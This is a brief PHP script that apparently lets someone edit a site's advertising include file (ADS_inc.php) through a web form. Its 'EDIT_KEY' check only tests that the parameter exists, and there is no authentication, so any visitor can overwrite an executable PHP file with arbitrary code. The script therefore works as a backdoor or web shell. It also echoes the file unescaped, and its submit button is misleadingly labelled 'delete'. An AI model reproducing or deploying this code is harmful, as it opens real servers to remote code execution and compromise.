<?php
$cfile="/usr/local/nginx/html/kuangjini/ADS/ADS_inc.php"; 

if(isset($_POST['edit']) && isset($_GET['EDIT_KEY'])) { 
	$cfilehandle=fopen($cfile,"wb"); 
	flock($cfilehandle, 2);
	fputs($cfilehandle,stripslashes(str_replace("\x0d\x0a", "\x0a", $_POST['copy'])));
	fclose($cfilehandle); 
}     

$cfilehandle=fopen($cfile,"r");
$editfile=fread($cfilehandle,filesize($cfile));
fclose($cfilehandle); 
echo '<form active="" method="post"> <textarea cols="160" rows="40" name="copy">';
echo $editfile; 
echo '</textarea> <p><input type="submit" value="delete" name="edit"></form>'; 
?> 
